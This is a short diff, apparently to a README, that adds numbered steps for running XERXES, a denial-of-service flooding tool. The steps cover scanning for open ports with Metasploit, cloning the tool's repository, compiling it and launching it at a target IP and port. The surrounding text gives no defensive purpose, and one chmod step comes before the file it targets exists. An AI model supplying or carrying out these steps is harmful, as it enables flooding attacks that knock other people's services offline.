@@ -6,3 +6,9 @@ When the cache cleaning is slower than the flood this attacks happen.
 # XERXES
 
 1. open metasploit framework and find open ports.
+2. git clone https://github.com/XCHADXFAQ77X/XERXES.git
+3. chmod 777 xerxes
+4. cd XERXES
+5. gcc -o xerxes xerxes.c
+6. chmod 777 xerxes
+7. ./xerxes <target_ip> <port>
